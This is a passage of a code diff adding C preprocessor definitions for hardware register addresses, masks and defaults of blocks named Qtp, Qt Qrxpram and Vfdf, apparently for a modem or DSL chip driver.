+#define IT_DCI_CTRL_FMASK      (0x1FFFFFF)
+
+/* Qt Qrxpram Address Constants */ 
+#define qt_qrxpram_reg_base    (0x252400)
+#define QT_QRXPRAM_REG(r)      (int)(qt_qrxpram_reg_base + (r))
+#define qt_qrxpram_reg_size    (0x0100)
+
+#define IR_CONFIG              QT_QRXPRAM_REG(0x0000)
+#define IR_CONFIG_WMASK        (0x0FFF)
+#define IR_CONFIG_MASK         (0x0FFF)
+#define IR_CONFIG_DEFAULT      (0x0000)
+#define IR_CONFIG_FMASK        (0x0FFF)
+#define IR_TCM_CTRL            QT_QRXPRAM_REG(0x0004)
+#define IR_TCM_CTRL_WMASK      (0x17FFFFF)
+#define IR_TCM_CTRL_MASK       (0x17FFFFF)
+#define IR_TCM_CTRL_DEFAULT    (0x0000)
+#define IR_TCM_CTRL_FMASK      (0x17FFFFF)
+#define IR_MISC                QT_QRXPRAM_REG(0x0008)
+#define IR_MISC_WMASK          (0x7FEFFFE0)
+#define IR_MISC_MASK           (0x7FEFFFE0)
+#define IR_MISC_DEFAULT        (0x0000)
+#define IR_MISC_FMASK          (0x7FEFFFE0)
+#define IR_ACT_ADDR            QT_QRXPRAM_REG(0x000C)
+#define IR_ACT_ADDR_WMASK      (0xFFF0FFF)
+#define IR_ACT_ADDR_MASK       (0xFFF0FFF)
+#define IR_ACT_ADDR_DEFAULT    (0x0000)
+#define IR_ACT_ADDR_FMASK      (0xFFF0FFF)
+#define IR_LP0_BITS            QT_QRXPRAM_REG(0x0010)
+#define IR_LP0_BITS_WMASK      (0xFFFF)
+#define IR_LP0_BITS_MASK       (0xFFFF)
+#define IR_LP0_BITS_DEFAULT    (0x0000)
+#define IR_LP0_BITS_FMASK      (0xFFFF)
+#define IR_LP1_BITS            QT_QRXPRAM_REG(0x0014)
+#define IR_LP1_BITS_WMASK      (0xFFFF)
+#define IR_LP1_BITS_MASK       (0xFFFF)
+#define IR_LP1_BITS_DEFAULT    (0x0000)
+#define IR_LP1_BITS_FMASK      (0xFFFF)
+#define IR_LP2_BITS            QT_QRXPRAM_REG(0x0018)
+#define IR_LP2_BITS_WMASK      (0xFFFF)
+#define IR_LP2_BITS_MASK       (0xFFFF)
+#define IR_LP2_BITS_DEFAULT    (0x0000)
+#define IR_LP2_BITS_FMASK      (0xFFFF)
+#define IR_DUMMY               QT_QRXPRAM_REG(0x001C)
+#define IR_DUMMY_WMASK         (0xFFFF)
+#define IR_DUMMY_MASK          (0xFFFF)
+#define IR_DUMMY_DEFAULT       (0x0000)
+#define IR_DUMMY_FMASK         (0xFFFF)
+#define IR_LP0_BIT_FIFO        QT_QRXPRAM_REG(0x0020)
+#define IR_LP0_BIT_FIFO_WMASK  (0x07FF)
+#define IR_LP0_BIT_FIFO_MASK   (0x07FF)
+#define IR_LP0_BIT_FIFO_DEFAULT (0x0000)
+#define IR_LP0_BIT_FIFO_FMASK  (0x07FF)
+#define IR_LP1_BIT_FIFO        QT_QRXPRAM_REG(0x0024)
+#define IR_LP1_BIT_FIFO_WMASK  (0x07FF)
+#define IR_LP1_BIT_FIFO_MASK   (0x07FF)
+#define IR_LP1_BIT_FIFO_DEFAULT (0x0000)
+#define IR_LP1_BIT_FIFO_FMASK  (0x07FF)
+#define IR_LP2_BIT_FIFO        QT_QRXPRAM_REG(0x0028)
+#define IR_LP2_BIT_FIFO_WMASK  (0x07FF)
+#define IR_LP2_BIT_FIFO_MASK   (0x07FF)
+#define IR_LP2_BIT_FIFO_DEFAULT (0x0000)
+#define IR_LP2_BIT_FIFO_FMASK  (0x07FF)
+#define IR_DEROT_MISC          QT_QRXPRAM_REG(0x002C)
+#define IR_DEROT_MISC_WMASK    (0x7FFF)
+#define IR_DEROT_MISC_MASK     (0x7FFF)
+#define IR_DEROT_MISC_DEFAULT  (0x0000)
+#define IR_DEROT_MISC_FMASK    (0x7FFF)
+#define IR_DEROT_POLY          QT_QRXPRAM_REG(0x0030)
+#define IR_DEROT_POLY_WMASK    (0xFFFFFFFF)
+#define IR_DEROT_POLY_MASK     (0xFFFFFFFF)
+#define IR_DEROT_POLY_DEFAULT  (0x0000)
+#define IR_DEROT_POLY_FMASK    (0xFFFFFFFF)
+#define IR_FD_RNG0             QT_QRXPRAM_REG(0x0034)
+#define IR_FD_RNG0_WMASK       (0xBFFFFFFF)
+#define IR_FD_RNG0_MASK        (0xBFFFFFFF)
+#define IR_FD_RNG0_DEFAULT     (0x0000)
+#define IR_FD_RNG0_FMASK       (0xBFFFFFFF)
+#define IR_FD_RNG1             QT_QRXPRAM_REG(0x0038)
+#define IR_FD_RNG1_WMASK       (0xBFFFFFFF)
+#define IR_FD_RNG1_MASK        (0xBFFFFFFF)
+#define IR_FD_RNG1_DEFAULT     (0x0000)
+#define IR_FD_RNG1_FMASK       (0xBFFFFFFF)
+#define IR_FD_RNG1_BASE        QT_QRXPRAM_REG(0x003C)
+#define IR_FD_RNG1_BASE_WMASK  (0x0FFF)
+#define IR_FD_RNG1_BASE_MASK   (0x0FFF)
+#define IR_FD_RNG1_BASE_DEFAULT (0x0000)
+#define IR_FD_RNG1_BASE_FMASK  (0x0FFF)
+#define IR_NPR_IIBRAM          QT_QRXPRAM_REG(0x0040)
+#define IR_NPR_IIBRAM_WMASK    (0x8000FFFF)
+#define IR_NPR_IIBRAM_MASK     (0x8000FFFF)
+#define IR_NPR_IIBRAM_DEFAULT  (0x0000)
+#define IR_NPR_IIBRAM_FMASK    (0x8000FFFF)
+#define IR_QUAD0               QT_QRXPRAM_REG(0x0044)
+#define IR_QUAD0_WMASK         (0xFFFFFFFF)
+#define IR_QUAD0_MASK          (0xFFFFFFFF)
+#define IR_QUAD0_DEFAULT       (0x0000)
+#define IR_QUAD0_FMASK         (0xFFFFFFFF)
+#define IR_QUAD1               QT_QRXPRAM_REG(0x0048)
+#define IR_QUAD1_WMASK         (0xFFFFFFFF)
+#define IR_QUAD1_MASK          (0xFFFFFFFF)
+#define IR_QUAD1_DEFAULT       (0x0000)
+#define IR_QUAD1_FMASK         (0xFFFFFFFF)
+#define IR_SLOWDOWN            QT_QRXPRAM_REG(0x004C)
+#define IR_SLOWDOWN_WMASK      (0x00FF)
+#define IR_SLOWDOWN_MASK       (0x00FF)
+#define IR_SLOWDOWN_DEFAULT    (0x0000)
+#define IR_SLOWDOWN_FMASK      (0x00FF)
+#define IR_PTINDEX             QT_QRXPRAM_REG(0x0050)
+#define IR_PTINDEX_WMASK       (0x1FFF)
+#define IR_PTINDEX_MASK        (0x1FFF)
+#define IR_PTINDEX_DEFAULT     (0x0000)
+#define IR_PTINDEX_FMASK       (0x1FFF)
+#define IR_PILOT               QT_QRXPRAM_REG(0x0054)
+#define IR_PILOT_WMASK         (0xFFFFFFFF)
+#define IR_PILOT_MASK          (0xFFFFFFFF)
+#define IR_PILOT_DEFAULT       (0x0000)
+#define IR_PILOT_FMASK         (0xFFFFFFFF)
+#define IR_FDQADAPT            QT_QRXPRAM_REG(0x0058)
+#define IR_FDQADAPT_WMASK      (0x73FF)
+#define IR_FDQADAPT_MASK       (0x73FF)
+#define IR_FDQADAPT_DEFAULT    (0x0000)
+#define IR_FDQADAPT_FMASK      (0x73FF)
+#define IR_VECPOW_L            QT_QRXPRAM_REG(0x005C)
+#define IR_VECPOW_L_WMASK      (0xFFFFFFFF)
+#define IR_VECPOW_L_MASK       (0xFFFFFFFF)
+#define IR_VECPOW_L_DEFAULT    (0x0000)
+#define IR_VECPOW_L_FMASK      (0xFFFFFFFF)
+#define IR_VECPOW_H            QT_QRXPRAM_REG(0x0060)
+#define IR_VECPOW_H_WMASK      (0x03FF)
+#define IR_VECPOW_H_MASK       (0x03FF)
+#define IR_VECPOW_H_DEFAULT    (0x0000)
+#define IR_VECPOW_H_FMASK      (0x03FF)
+#define IR_RMETRIC_CTL         QT_QRXPRAM_REG(0x0064)
+#define IR_RMETRIC_CTL_WMASK   (0x001F)
+#define IR_RMETRIC_CTL_MASK    (0x001F)
+#define IR_RMETRIC_CTL_DEFAULT (0x0000)
+#define IR_RMETRIC_CTL_FMASK   (0x001F)
+#define IR_RMETRIC_VAL         QT_QRXPRAM_REG(0x0068)
+#define IR_RMETRIC_VAL_WMASK   (0x00FF)
+#define IR_RMETRIC_VAL_MASK    (0x00FF)
+#define IR_RMETRIC_VAL_DEFAULT (0x0000)
+#define IR_RMETRIC_VAL_FMASK   (0x00FF)
+#define IR_RXCG_0              QT_QRXPRAM_REG(0x006C)
+#define IR_RXCG_0_WMASK        (0x7FFFF)
+#define IR_RXCG_0_MASK         (0x7FFFF)
+#define IR_RXCG_0_DEFAULT      (0x0000)
+#define IR_RXCG_0_FMASK        (0x7FFFF)
+#define IR_RXCG_1              QT_QRXPRAM_REG(0x0070)
+#define IR_RXCG_1_WMASK        (0x7FFFF)
+#define IR_RXCG_1_MASK         (0x7FFFF)
+#define IR_RXCG_1_DEFAULT      (0x0000)
+#define IR_RXCG_1_FMASK        (0x7FFFF)
+#define IR_RXCG_2              QT_QRXPRAM_REG(0x0074)
+#define IR_RXCG_2_WMASK        (0x7FFFF)
+#define IR_RXCG_2_MASK         (0x7FFFF)
+#define IR_RXCG_2_DEFAULT      (0x0000)
+#define IR_RXCG_2_FMASK        (0x7FFFF)
+#define IR_RXCG_3              QT_QRXPRAM_REG(0x0078)
+#define IR_RXCG_3_WMASK        (0x7FFFF)
+#define IR_RXCG_3_MASK         (0x7FFFF)
+#define IR_RXCG_3_DEFAULT      (0x0000)
+#define IR_RXCG_3_FMASK        (0x7FFFF)
+#define IR_RXCG_4              QT_QRXPRAM_REG(0x007C)
+#define IR_RXCG_4_WMASK        (0x7FFFF)
+#define IR_RXCG_4_MASK         (0x7FFFF)
+#define IR_RXCG_4_DEFAULT      (0x0000)
+#define IR_RXCG_4_FMASK        (0x7FFFF)
+#define IR_RXCG_5              QT_QRXPRAM_REG(0x0080)
+#define IR_RXCG_5_WMASK        (0x7FFFF)
+#define IR_RXCG_5_MASK         (0x7FFFF)
+#define IR_RXCG_5_DEFAULT      (0x0000)
+#define IR_RXCG_5_FMASK        (0x7FFFF)
+#define IR_RXCG_6              QT_QRXPRAM_REG(0x0084)
+#define IR_RXCG_6_WMASK        (0x7FFFF)
+#define IR_RXCG_6_MASK         (0x7FFFF)
+#define IR_RXCG_6_DEFAULT      (0x0000)
+#define IR_RXCG_6_FMASK        (0x7FFFF)
+#define IR_RXCG_7              QT_QRXPRAM_REG(0x0088)
+#define IR_RXCG_7_WMASK        (0x7FFFF)
+#define IR_RXCG_7_MASK         (0x7FFFF)
+#define IR_RXCG_7_DEFAULT      (0x0000)
+#define IR_RXCG_7_FMASK        (0x7FFFF)
+#define IR_RXCG_8              QT_QRXPRAM_REG(0x008C)
+#define IR_RXCG_8_WMASK        (0x7FFFF)
+#define IR_RXCG_8_MASK         (0x7FFFF)
+#define IR_RXCG_8_DEFAULT      (0x0000)
+#define IR_RXCG_8_FMASK        (0x7FFFF)
+#define IR_RXCG_9              QT_QRXPRAM_REG(0x0090)
+#define IR_RXCG_9_WMASK        (0x7FFFF)
+#define IR_RXCG_9_MASK         (0x7FFFF)
+#define IR_RXCG_9_DEFAULT      (0x0000)
+#define IR_RXCG_9_FMASK        (0x7FFFF)
+#define IR_RXCG_10             QT_QRXPRAM_REG(0x0094)
+#define IR_RXCG_10_WMASK       (0x7FFFF)
+#define IR_RXCG_10_MASK        (0x7FFFF)
+#define IR_RXCG_10_DEFAULT     (0x0000)
+#define IR_RXCG_10_FMASK       (0x7FFFF)
+#define IR_RXCG_11             QT_QRXPRAM_REG(0x0098)
+#define IR_RXCG_11_WMASK       (0x7FFFF)
+#define IR_RXCG_11_MASK        (0x7FFFF)
+#define IR_RXCG_11_DEFAULT     (0x0000)
+#define IR_RXCG_11_FMASK       (0x7FFFF)
+#define IR_RXCG_12             QT_QRXPRAM_REG(0x009C)
+#define IR_RXCG_12_WMASK       (0x7FFFF)
+#define IR_RXCG_12_MASK        (0x7FFFF)
+#define IR_RXCG_12_DEFAULT     (0x0000)
+#define IR_RXCG_12_FMASK       (0x7FFFF)
+#define IR_RXCG_13             QT_QRXPRAM_REG(0x00A0)
+#define IR_RXCG_13_WMASK       (0x7FFFF)
+#define IR_RXCG_13_MASK        (0x7FFFF)
+#define IR_RXCG_13_DEFAULT     (0x0000)
+#define IR_RXCG_13_FMASK       (0x7FFFF)
+#define IR_RXCG_14             QT_QRXPRAM_REG(0x00A4)
+#define IR_RXCG_14_WMASK       (0x7FFFF)
+#define IR_RXCG_14_MASK        (0x7FFFF)
+#define IR_RXCG_14_DEFAULT     (0x0000)
+#define IR_RXCG_14_FMASK       (0x7FFFF)
+#define IR_RXCG_15             QT_QRXPRAM_REG(0x00A8)
+#define IR_RXCG_15_WMASK       (0x7FFFF)
+#define IR_RXCG_15_MASK        (0x7FFFF)
+#define IR_RXCG_15_DEFAULT     (0x0000)
+#define IR_RXCG_15_FMASK       (0x7FFFF)
+
+/* Qtp Memory Address Constants */ 
+#define qtp_ibat_base          (0x244000)
+#define qtp_ibat_mask          (0xF0F0F0F)
+#define qtp_ibat_size          (0x1000)
+#define qtp_ibat_default       (0x0000)
+#define qtp_igst_base          (0x246000)
+#define qtp_igst_mask          (0xFFFFFFFF)
+#define qtp_igst_size          (0x2000)
+#define qtp_igst_default       (0x0000)
+#define qtp_iegt_base          (0x248000)
+#define qtp_iegt_mask          (0xF0F0F0F)
+#define qtp_iegt_size          (0x1000)
+#define qtp_iegt_default       (0x0000)
+#define qtp_itot_base          (0x24A000)
+#define qtp_itot_mask          (0xFFF0FFF)
+#define qtp_itot_size          (0x2000)
+#define qtp_itot_default       (0x0000)
+#define qtp_ifbt_base          (0x24C000)
+#define qtp_ifbt_mask          (0xFFF0FFF)
+#define qtp_ifbt_size          (0x0080)
+#define qtp_ifbt_default       (0x0000)
+#define qtp_txpram_base        (0x252800)
+#define qtp_txpram_mask        (0xFFFFFFFF)
+#define qtp_txpram_size        (0x0040)
+#define qtp_txpram_default     (0x0000)
+#define qtp_rxpram_base        (0x252840)
+#define qtp_rxpram_mask        (0xFFFFFFFF)
+#define qtp_rxpram_size        (0x0040)
+#define qtp_rxpram_default     (0x0000)
+
+/* Qtp Global Address Constants */ 
+#define qtp_global_base        (0x20CB00)
+#define QTP_GLOBAL(r)          (int)(qtp_global_base + (r))
+#define qtp_global_size        (0x0100)
+
+#define QTP_CONFIG             QTP_GLOBAL(0x0000)
+#define QTP_CONFIG_WMASK       (0x0007)
+#define QTP_CONFIG_MASK        (0x0007)
+#define QTP_CONFIG_DEFAULT     (0x0000)
+#define QTP_CONFIG_FMASK       (0x0007)
+#define QTP_STATUS             QTP_GLOBAL(0x0004)
+#define QTP_STATUS_WMASK       (0x0003)
+#define QTP_STATUS_MASK        (0x0003)
+#define QTP_STATUS_DEFAULT     (0x0000)
+#define QTP_STATUS_FMASK       (0x0000)
+#define QTP_TX_PRBS_DATA0      QTP_GLOBAL(0x0008)
+#define QTP_TX_PRBS_DATA0_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA0_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA0_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA0_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA1      QTP_GLOBAL(0x000C)
+#define QTP_TX_PRBS_DATA1_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA1_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA1_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA1_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA2      QTP_GLOBAL(0x0010)
+#define QTP_TX_PRBS_DATA2_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA2_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA2_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA2_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA3      QTP_GLOBAL(0x0014)
+#define QTP_TX_PRBS_DATA3_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA3_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA3_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA3_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA4      QTP_GLOBAL(0x0018)
+#define QTP_TX_PRBS_DATA4_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA4_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA4_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA4_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA5      QTP_GLOBAL(0x001C)
+#define QTP_TX_PRBS_DATA5_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA5_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA5_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA5_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA6      QTP_GLOBAL(0x0020)
+#define QTP_TX_PRBS_DATA6_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA6_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA6_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA6_FMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA7      QTP_GLOBAL(0x0024)
+#define QTP_TX_PRBS_DATA7_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA7_MASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_DATA7_DEFAULT (0x0000)
+#define QTP_TX_PRBS_DATA7_FMASK (0xFFFFFFFF)
+
+/* Qtp Txpram Address Constants */ 
+#define qtp_txpram_reg_base    (0x252800)
+#define QTP_TXPRAM_REG(r)      (int)(qtp_txpram_reg_base + (r))
+#define qtp_txpram_reg_size    (0x0100)
+
+#define QTP_TX_CTRL            QTP_TXPRAM_REG(0x0000)
+#define QTP_TX_CTRL_WMASK      (0x3FFF)
+#define QTP_TX_CTRL_MASK       (0x3FFF)
+#define QTP_TX_CTRL_DEFAULT    (0x0000)
+#define QTP_TX_CTRL_FMASK      (0x3FFF)
+#define QTP_TXTC_CTRL          QTP_TXPRAM_REG(0x0004)
+#define QTP_TXTC_CTRL_WMASK    (0x3FFFFFFF)
+#define QTP_TXTC_CTRL_MASK     (0x3FFFFFFF)
+#define QTP_TXTC_CTRL_DEFAULT  (0x0000)
+#define QTP_TXTC_CTRL_FMASK    (0x3FFFFFFF)
+#define QTP_TXTC_TOT_AD        QTP_TXPRAM_REG(0x0008)
+#define QTP_TXTC_TOT_AD_WMASK  (0xFFFFFF)
+#define QTP_TXTC_TOT_AD_MASK   (0xFFFFFF)
+#define QTP_TXTC_TOT_AD_DEFAULT (0x0000)
+#define QTP_TXTC_TOT_AD_FMASK  (0xFFFFFF)
+#define QTP_TXTC_ACT_AD        QTP_TXPRAM_REG(0x000C)
+#define QTP_TXTC_ACT_AD_WMASK  (0xFFFFFF)
+#define QTP_TXTC_ACT_AD_MASK   (0xFFFFFF)
+#define QTP_TXTC_ACT_AD_DEFAULT (0x0000)
+#define QTP_TXTC_ACT_AD_FMASK  (0xFFFFFF)
+#define QTP_TX_PRBS            QTP_TXPRAM_REG(0x0010)
+#define QTP_TX_PRBS_WMASK      (0xFFFFFFFF)
+#define QTP_TX_PRBS_MASK       (0xFFFFFFFF)
+#define QTP_TX_PRBS_DEFAULT    (0x0000)
+#define QTP_TX_PRBS_FMASK      (0xFFFFFFFF)
+#define QTP_TX_PRBS_MISC       QTP_TXPRAM_REG(0x0014)
+#define QTP_TX_PRBS_MISC_WMASK (0xFFFFFDF0)
+#define QTP_TX_PRBS_MISC_MASK  (0xFFFFFDF0)
+#define QTP_TX_PRBS_MISC_DEFAULT (0x0000)
+#define QTP_TX_PRBS_MISC_FMASK (0xFFFFFDF0)
+#define QTP_TX_PRBS_POLY       QTP_TXPRAM_REG(0x0018)
+#define QTP_TX_PRBS_POLY_WMASK (0xFFFFFFFF)
+#define QTP_TX_PRBS_POLY_MASK  (0xFFFFFFFF)
+#define QTP_TX_PRBS_POLY_DEFAULT (0x0000)
+#define QTP_TX_PRBS_POLY_FMASK (0xFFFFFFFF)
+
+/* Qtp Rxpram Address Constants */ 
+#define qtp_rxpram_reg_base    (0x252840)
+#define QTP_RXPRAM_REG(r)      (int)(qtp_rxpram_reg_base + (r))
+#define qtp_rxpram_reg_size    (0x0100)
+
+#define QTP_RX_CTRL            QTP_RXPRAM_REG(0x0000)
+#define QTP_RX_CTRL_WMASK      (0x3FFF)
+#define QTP_RX_CTRL_MASK       (0x3FFF)
+#define QTP_RX_CTRL_DEFAULT    (0x0000)
+#define QTP_RX_CTRL_FMASK      (0x3FFF)
+#define QTP_RXTC_CTRL          QTP_RXPRAM_REG(0x0004)
+#define QTP_RXTC_CTRL_WMASK    (0x3FFFFFFF)
+#define QTP_RXTC_CTRL_MASK     (0x3FFFFFFF)
+#define QTP_RXTC_CTRL_DEFAULT  (0x0000)
+#define QTP_RXTC_CTRL_FMASK    (0x3FFFFFFF)
+#define QTP_RXTC_TOT_AD        QTP_RXPRAM_REG(0x0008)
+#define QTP_RXTC_TOT_AD_WMASK  (0xFFFFFF)
+#define QTP_RXTC_TOT_AD_MASK   (0xFFFFFF)
+#define QTP_RXTC_TOT_AD_DEFAULT (0x0000)
+#define QTP_RXTC_TOT_AD_FMASK  (0xFFFFFF)
+#define QTP_RXTC_ACT_AD        QTP_RXPRAM_REG(0x000C)
+#define QTP_RXTC_ACT_AD_WMASK  (0xFFFFFF)
+#define QTP_RXTC_ACT_AD_MASK   (0xFFFFFF)
+#define QTP_RXTC_ACT_AD_DEFAULT (0x0000)
+#define QTP_RXTC_ACT_AD_FMASK  (0xFFFFFF)
+#define QTP_RX_PRBS            QTP_RXPRAM_REG(0x0010)
+#define QTP_RX_PRBS_WMASK      (0xFFFFFFFF)
+#define QTP_RX_PRBS_MASK       (0xFFFFFFFF)
+#define QTP_RX_PRBS_DEFAULT    (0x0000)
+#define QTP_RX_PRBS_FMASK      (0xFFFFFFFF)
+#define QTP_RX_PRBS_MISC       QTP_RXPRAM_REG(0x0014)
+#define QTP_RX_PRBS_MISC_WMASK (0x7DF0)
+#define QTP_RX_PRBS_MISC_MASK  (0x7DF0)
+#define QTP_RX_PRBS_MISC_DEFAULT (0x0000)
+#define QTP_RX_PRBS_MISC_FMASK (0x7DF0)
+#define QTP_RX_PRBS_POLY       QTP_RXPRAM_REG(0x0018)
+#define QTP_RX_PRBS_POLY_WMASK (0xFFFFFFFF)
+#define QTP_RX_PRBS_POLY_MASK  (0xFFFFFFFF)
+#define QTP_RX_PRBS_POLY_DEFAULT (0x0000)
+#define QTP_RX_PRBS_POLY_FMASK (0xFFFFFFFF)
+#define QTP_RX_PRBS_OFFSET     QTP_RXPRAM_REG(0x001C)
+#define QTP_RX_PRBS_OFFSET_WMASK (0xFFF0FFF)
+#define QTP_RX_PRBS_OFFSET_MASK (0xFFF0FFF)
+#define QTP_RX_PRBS_OFFSET_DEFAULT (0x0000)
+#define QTP_RX_PRBS_OFFSET_FMASK (0xFFF0FFF)
+
+/* Vfdf Memory Address Constants */ 
+#define vfdf_decimco_base      (0x200000)
+#define vfdf_decimco_mask      (0xFFFFFFFF)
+#define vfdf_decimco_size      (0x0120)
+#define vfdf_decimco_default   (0x0000)
+#define vfdf_decimps_base      (0x200800)
+#define vfdf_decimps_mask      (0xFFFFFFFF)
+#define vfdf_decimps_size      (0x0220)
+#define vfdf_decimps_default   (0x0000)
+#define vfdf_rxwincops_base    (0x201000)
+#define vfdf_rxwincops_mask    (0xFFFFFFFF)
+#define vfdf_rxwincops_size    (0x0300)
+#define vfdf_rxwincops_default (0x0000)
+#define vfdf_txwincops_base    (0x201800)
+#define vfdf_txwincops_mask    (0xFFFFFFFF)
+#define vfdf_txwincops_size    (0x0480)
+#define vfdf_txwincops_default (0x0000)
+#define vfdf_dectdqps_base     (0x202000)
+#define vfdf_dectdqps_mask     (0xFFFFFFFF)
+#define vfdf_dectdqps_size     (0x0800)
+#define vfdf_dectdqps_default  (0x0000)
+#define vfdf_dectdqco_base     (0x202800)
+#define vfdf_dectdqco_mask     (0xFFFFFFFF)
+#define vfdf_dectdqco_size     (0x0600)
+#define vfdf_dectdqco_default  (0x0000)
+#define vfdf_txiir_co_base     (0x204000)
+#define vfdf_txiir_co_mask     (0x3FFFFF)
+#define vfdf_txiir_co_size     (0x007C)
+#define vfdf_txiir_co_default  (0x0000)
+#define vfdf_rxiir_co_base     (0x204100)
+#define vfdf_rxiir_co_mask     (0x3FFFF)
+#define vfdf_rxiir_co_size     (0x007C)
+#define vfdf_rxiir_co_default  (0x0000)
+#define vfdf_interpco_base     (0x204400)
+#define vfdf_interpco_mask     (0xFFFFFFFF)
+#define vfdf_interpco_size     (0x0200)
+#define vfdf_interpco_default  (0x0000)
+#define vfdf_decadapt_base     (0x204800)
+#define vfdf_decadapt_mask     (0xFFFFFFFF)
+#define vfdf_decadapt_size     (0x0800)
+#define vfdf_decadapt_default  (0x0000)
+#define vfdf_srcco_b00_rx_base (0x205000)
+#define vfdf_srcco_b00_rx_mask (0x1FFF0FF)
+#define vfdf_srcco_b00_rx_size (0x0800)
+#define vfdf_srcco_b00_rx_default (0x0000)
+#define vfdf_srcco_b01_rx_base (0x205800)
+#define vfdf_srcco_b01_rx_mask (0x3FFF1FF)
+#define vfdf_srcco_b01_rx_size (0x0800)
+#define vfdf_srcco_b01_rx_default (0x0000)
+#define vfdf_srcco_b02_rx_base (0x206000)
+#define vfdf_srcco_b02_rx_mask (0x1FFFF7FF)
+#define vfdf_srcco_b02_rx_size (0x0800)
+#define vfdf_srcco_b02_rx_default (0x0000)
+#define vfdf_srcco_b12_rx_base (0x206800)
+#define vfdf_srcco_b12_rx_mask (0x1FFFF7FF)
+#define vfdf_srcco_b12_rx_size (0x0800)
+#define vfdf_srcco_b12_rx_default (0x0000)
+#define vfdf_srcco_b11_rx_base (0x207000)
+#define vfdf_srcco_b11_rx_mask (0x3FFF1FF)
+#define vfdf_srcco_b11_rx_size (0x0800)
+#define vfdf_srcco_b11_rx_default (0x0000)
+#define vfdf_srcco_b10_rx_base (0x207800)
+#define vfdf_srcco_b10_rx_mask (0x1FFF0FF)
+#define vfdf_srcco_b10_rx_size (0x0800)
+#define vfdf_srcco_b10_rx_default (0x0000)
+#define vfdf_srcco_b00_tx_base (0x208000)
+#define vfdf_srcco_b00_tx_mask (0x1FFF0FF)
+#define vfdf_srcco_b00_tx_size (0x0800)
+#define vfdf_srcco_b00_tx_default (0x0000)
+#define vfdf_srcco_b01_tx_base (0x208800)
+#define vfdf_srcco_b01_tx_mask (0x3FFF1FF)
+#define vfdf_srcco_b01_tx_size (0x0800)
+#define vfdf_srcco_b01_tx_default (0x0000)
+#define vfdf_srcco_b02_tx_base (0x209000)
+#define vfdf_srcco_b02_tx_mask (0x1FFFF7FF)
+#define vfdf_srcco_b02_tx_size (0x0800)
+#define vfdf_srcco_b02_tx_default (0x0000)
+#define vfdf_srcco_b12_tx_base (0x209800)
+#define vfdf_srcco_b12_tx_mask (0x1FFFF7FF)
+#define vfdf_srcco_b12_tx_size (0x0800)
+#define vfdf_srcco_b12_tx_default (0x0000)
+#define vfdf_srcco_b11_tx_base (0x20A000)
+#define vfdf_srcco_b11_tx_mask (0x3FFF1FF)
+#define vfdf_srcco_b11_tx_size (0x0800)
+#define vfdf_srcco_b11_tx_default (0x0000)
+#define vfdf_srcco_b10_tx_base (0x20A800)
+#define vfdf_srcco_b10_tx_mask (0x1FFF0FF)
+#define vfdf_srcco_b10_tx_size (0x0800)
+#define vfdf_srcco_b10_tx_default (0x0000)
+
+/* Vfdf Global Address Constants */ 
+#define vfdf_global_base       (0x20C600)
+#define VFDF_GLOBAL(r)         (int)(vfdf_global_base + (r))
+#define vfdf_global_size       (0x0200)
+
+#define V_CONTROL              VFDF_GLOBAL(0x0000)
+#define V_CONTROL_WMASK        (0xDFFFC802)
+#define V_CONTROL_MASK         (0xDFFFCA02)
+#define V_CONTROL_DEFAULT      (0x50000000)
+#define V_CONTROL_FMASK        (0xDFFFC802)
+#define V_BLOCK_RSTN           VFDF_GLOBAL(0x0004)
+#define V_BLOCK_RSTN_WMASK     (0x0077)
+#define V_BLOCK_RSTN_MASK      (0x0077)
+#define V_BLOCK_RSTN_DEFAULT   (0x0077)
+#define V_BLOCK_RSTN_FMASK     (0x0077)
+#define V_OVERFLOW             VFDF_GLOBAL(0x0008)
+#define V_OVERFLOW_WMASK       (0x1FEBF)
+#define V_OVERFLOW_MASK        (0x1FEBF)
+#define V_OVERFLOW_DEFAULT     (0x0000)
+#define V_OVERFLOW_FMASK       (0x0000)
+#define V_TXIIR1_CFG           VFDF_GLOBAL(0x000C)
+#define V_TXIIR1_CFG_WMASK     (0x1F7FFFF)
+#define V_TXIIR1_CFG_MASK      (0x1F7FFFF)
+#define V_TXIIR1_CFG_DEFAULT   (0x0000)
+#define V_TXIIR1_CFG_FMASK     (0x1F7FFFF)
+#define V_TXIIR2_CFG           VFDF_GLOBAL(0x0010)
+#define V_TXIIR2_CFG_WMASK     (0xF00FF)
+#define V_TXIIR2_CFG_MASK      (0xF00FF)
+#define V_TXIIR2_CFG_DEFAULT   (0x0000)
+#define V_TXIIR2_CFG_FMASK     (0xF00FF)
+#define V_RXIIR1_CFG           VFDF_GLOBAL(0x0014)
+#define V_RXIIR1_CFG_WMASK     (0x1F7FFFF)
+#define V_RXIIR1_CFG_MASK      (0x1F7FFFF)
+#define V_RXIIR1_CFG_DEFAULT   (0x0000)
